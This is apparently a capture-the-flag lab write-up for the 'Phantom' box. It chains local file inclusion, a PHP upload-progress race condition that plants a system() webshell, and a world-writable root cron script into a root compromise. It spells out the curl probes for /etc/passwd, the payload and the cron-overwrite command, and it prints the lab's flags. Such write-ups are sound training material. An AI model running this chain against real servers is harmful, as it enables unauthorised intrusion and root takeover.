---
doc_kind: writeup
title: "ThunderCipher TC-VAPT Exam#1 — Phantom"
category: web
slug: thundercipher-tcvapt-phantom
created: 2026-11-09
status: solved
tags:
  - lfi
  - session-upload-progress-race
  - cron-persistence
  - world-writable-cron
  - nosuid-bypass
source: "ThunderCipher (thundercipher.in) — TC-VAPT Exam #1"
target: "http://192.168.5.237/ (Phantom, SSH+HTTP, VPN lab)"
---
# ThunderCipher TC-VAPT Exam#1 — Phantom

## Challenge Summary

- Source: ThunderCipher (thundercipher.in) — TC-VAPT Exam #1
- Target: http://192.168.5.237/ (Phantom, SSH+HTTP only, VPN lab)
- Goal: initial access + root, capture user.txt + root.txt
- Prompt hint: "suspicious activity detected... determine if an attacker has established persistence" —
  this was a direct signal that the privesc path would be a *persistence mechanism* (cron), not a
  classic SUID/sudoers misconfig like the other two boxes.

## Initial Signals

- Entry point: "Phantom Internal Portal", content driven by `?page=` URL param, sidebar links like
  `?page=logs.php`. In-app banner text: "Legacy file loader is still active in this build." — explicit LFI
  hint.
- First confirming probe: `?page=../../../../../../etc/passwd` → full `/etc/passwd` contents returned.

## Exploit Chain

1. `nmap -p1-1000` → 22/ssh + 80/http only.
2. `?page=home.php` is the default; the "Legacy file loader" banner text telegraphs LFI.
3. Confirmed LFI: `?page=../../../../../../etc/passwd` → passwd contents.
4. Confirmed source via `php://filter`: `?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php`
   → decoded to `$page = $_GET['page'] ?? 'home.php'; include($page);` — no sanitization, no extension
   appended (so arbitrary absolute paths and wrappers work directly, not just relative to a pages/ dir).
5. Tried direct-RCE wrappers: `data://text/plain;base64,<payload>` and `php://input` with POST body — both
   produced empty output. Confirmed via LFI-read of `/etc/php/8.4/apache2/php.ini` that
   `allow_url_include = Off` (blocks both).
6. Tried classic Apache log poisoning (`User-Agent: <?php ...?>` then include `/var/log/apache2/access.log`)
   — files unreadable by `www-data` (confirmed `www-data` is not in the `adm` group via `/etc/group` LFI
   read). All of `/var/log/*` was a dead end.
7. **Working RCE**: PHP `session.upload_progress` race condition. Sent a slow multipart POST with
   `PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET["c"]); ?>` and a chosen `PHPSESSID` cookie, with a large
   filler file field dripped slowly (keeps the session file on disk longer). In parallel, hammered
   `?page=/var/lib/php/sessions/sess_<id>&c=<cmd>` in a loop until the include landed while the session file
   still contained the raw payload (before PHP finishes/cleans it up). Confirmed `id` → `www-data`.
   This works even with `session.auto_start=0` and no app-level `session_start()` call, because PHP's
   upload-progress tracking hooks multipart request parsing directly, independent of the app's own session
   usage.
8. User flag was directly readable via the RCE (`cat /home/phantom/user.txt`) despite `/home/phantom` being
   `drwx--x--x` (execute-only, no read) — traversal into a *known* filename still works with just the
   execute bit; only `ls`-style listing needs the read bit.
9. Persistence investigation (matching the challenge's own framing): `cat /etc/crontab` →
   `* * * * * root /opt/backup.sh`. `ls -la /opt/backup.sh` → `-rwxrwxrwx root:root` — world-writable root
   cron script, the intended privesc vector.
10. First privesc attempt: overwrote `/opt/backup.sh` with `cp /bin/bash /tmp/rootbash; chmod 4755
    /tmp/rootbash`. Waited for the cron tick — **failed silently**. `mount` (via RCE) showed
    `tmpfs on /tmp type tmpfs (rw,nosuid,nodev,...)` — `/tmp` is `nosuid`, so the SUID bit on the copied
    bash never took effect even though `chmod` itself "succeeded".
11. Fixed by writing *outside* `/tmp`: rewrote `/opt/backup.sh` to
    `cat /root/root.txt > /opt/out.txt 2>&1; chmod 666 /opt/out.txt` (writable because the cron job itself
    runs as root, and `/opt` is on the root ext4 filesystem with no `nosuid`/`noexec` restriction — though
    here we don't even need exec, just a root-owned write). Waited one cron tick (~60s), then read the flag
    via the LFI itself: `?page=/opt/out.txt`.
12. Cleaned up: restored `/opt/backup.sh` to its original `tar -czf /tmp/backup.tar.gz /home/phantom`
    content, removed `/opt/out.txt`, `/tmp/rootbash`, `/tmp/cron_test`.

## Key Evidence

- `curl -s "http://192.168.5.237/?page=../../../../../../etc/passwd"` → `root:x:0:0:root:/root:/bin/bash...`
- `curl -s "http://192.168.5.237/?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php"`
  decoded → `$page = $_GET['page'] ?? 'home.php'; include($page);`
- `/etc/php/8.4/apache2/php.ini` (read via LFI) → `allow_url_include = Off`, `allow_url_fopen = On`,
  `disable_functions = ` (empty — system()/exec() work once we get RCE).
- Race condition script output: `=== GOT OUTPUT ===\nuid=33(www-data) gid=33(www-data) groups=33(www-data)`
- `cat /etc/crontab` → `* * * * * root /opt/backup.sh`
- `ls -la /opt/backup.sh` → `-rwxrwxrwx 1 root root 54 ... /opt/backup.sh`
- `mount` → `tmpfs on /tmp type tmpfs (rw,nosuid,nodev,...)`
- Final flag read via `?page=/opt/out.txt` → `ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e}`

## Dead Ends

- `data://` and `php://input` wrappers for direct RCE — blocked by `allow_url_include=Off`.
- Apache access/error log poisoning — logs owned `root:adm`, `www-data` not in `adm` group, unreadable.
- `/etc/auth.log`, `/etc/syslog` etc. — same permission issue, all root:adm.
- First privesc attempt (SUID bash dropped in `/tmp`) — silently defeated by `nosuid` mount on `/tmp`; the
  `chmod 4755` command itself returns success/no error, so this failure mode is easy to miss without
  explicitly checking `mount` output or testing the resulting binary's effective UID.

## Payloads And Commands

```bash
# LFI confirmation + source read
curl -s "http://192.168.5.237/?page=../../../../../../etc/passwd"
curl -s "http://192.168.5.237/?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php"

# race condition LFI-to-RCE (see artifacts/race_lfi.py in the workspace for the full script)
python3 race_lfi.py "id"          # proves RCE
python3 race_lfi.py "cat /etc/crontab"
python3 race_lfi.py "ls -la /opt/backup.sh"

# privesc: nosuid /tmp defeats a dropped SUID binary there — write outside /tmp instead
python3 race_lfi.py "printf '#!/bin/bash\ncat /root/root.txt > /opt/out.txt 2>&1; chmod 666 /opt/out.txt\n' > /opt/backup.sh"
# wait <60s for the cron tick, then:
curl -s "http://192.168.5.237/?page=/opt/out.txt"
```

## Flag / Outcome

- User: `ThunderCipher{phantom_lfi_to_ssh_access_gained_7f3a9c2d8e1b}`
- Root: `ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e}`
- Full chain solved end-to-end. No SSH access was ever actually used (RCE via LFI race condition was
  sufficient for everything, despite the flag name mentioning "ssh_access" — that's flavor text, not a
  literal description of the path taken).

## Reusable Lessons

- When `allow_url_include=Off` blocks `data://`/`php://input` RCE on an LFI, and log files are unreadable
  (common: Apache logs are `root:adm`, web user isn't in `adm`), **`session.upload_progress` race condition**
  is the next thing to try — it works even without the app calling `session_start()` itself, as long as
  `session.upload_progress.enabled` is at its PHP default (On, even when commented-out in php.ini).
- Always verify a `chmod +s` / SUID-drop actually took effect by checking `mount` for `nosuid` on the target
  filesystem — `/tmp` being `nosuid` is a very common hardening default on modern distros and will silently
  defeat this classic technique. When blocked, write outside the nosuid mount (e.g. a `/opt` or `/var`
  directory on the root fs) instead of fighting the mount flag.
- A challenge prompt framed around "investigate persistence" is a strong signal to check `/etc/crontab` and
  `/etc/cron.d/` for root jobs pointing at attacker-writable scripts — this is the single most common
  "persistence" CTF vector and should be an early privesc check whenever the prompt uses that language.
- A directory with execute-but-no-read permission (`drwx--x--x`) still allows reading a file inside it if
  you already know the exact filename (e.g. `user.txt`) — don't assume restrictive home-dir perms block
  flag reads.

## Pattern Candidates

- New pattern created: [[php-session-upload-progress-lfi-rce]]
- New pattern created: [[world-writable-cron-root-privesc]]
- Related: [[directory-listing-leaks-sensitive-files]] (less relevant here — Phantom's bug was LFI, not
  directory listing, but same exam set)
